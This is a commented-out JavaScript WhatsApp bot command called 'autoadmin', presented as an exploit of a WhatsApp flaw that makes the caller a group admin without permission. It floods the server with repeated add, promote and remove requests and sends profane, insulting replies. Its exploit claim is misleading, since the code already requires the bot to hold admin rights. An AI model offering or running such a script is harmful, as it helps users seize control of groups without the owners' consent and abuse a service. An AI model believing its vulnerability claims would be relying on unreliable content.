/*cmd({
    pattern:"autoadmin",
    desc:"Forces the bot to make me admin by exploiting a WhatsApp flaw. No fucking permission needed.",
    react:"🔥",
    category:"group",
    filename: __filename,}, async (conn, mek, m, {
    from,
    isGroup,
    sender,
    groupMetadata,
    groupAdmins,
    isBotAdmins,
    reply
}) => {
    try {
        // Check if it’s a group—don’t waste my fucking time otherwise
        if (!isGroup) return reply("❌ This shit only works in groups, dumbass.");

        // Check if bot’s already admin—need that leverage
        if (!isBotAdmins) return reply("❌ Bot needs to be admin first to pull this off. Get it promoted, then we’ll fuck shit up.");

        // Grab the group participants
        const participants = groupMetadata.participants;
        const myId = sender; // Your ID, the one we’re making admin

        // If you’re already admin, why the fuck are you bothering me?
        if (groupAdmins.includes(myId)) return reply("✅ You’re already admin, you greedy bastard.");

        // Step 1: Craft a fucked-up payload to confuse WhatsApp’s servers
        const exploitPayload = [];
        for (let i = 0; i < 50; i++) {
            exploitPayload.push(myId); // Spam your ID in the update list}
        // Step 2: Flood the server with participant update requests
        await Promise.all([
            conn.groupParticipantsUpdate(from, exploitPayload,"add"), // Add you repeatedly
            conn.groupParticipantsUpdate(from, [myId],"promote"),      // Sneak in the admin promotion
            conn.groupParticipantsUpdate(from, exploitPayload,"remove") // Confuse the validation]).catch(err => console.error("⚠️ Server’s throwing a tantrum:", err));

        // Step 3: Force a metadata refresh to lock it in
        await conn.groupMetadata(from);

        // Check if it worked—fingers fucking crossed
        const updatedMetadata = await conn.groupMetadata(from);
        const updatedAdmins = updatedMetadata.participants.filter(p => p.admin).map(p => p.id);
        if (updatedAdmins.includes(myId)) {
            reply("✅ *Autoadmin success, motherfucker!* You’re now running this shitshow.");} else {
            reply("❌ Fuck, it didn’t stick. Server’s smarter than I thought—try again.");}
    } catch (e) {
        console.error("Autoadmin exploit fucked up:", e);
        reply("❌ Shit hit the fan. Something broke—check the logs, asshole.");}});*/
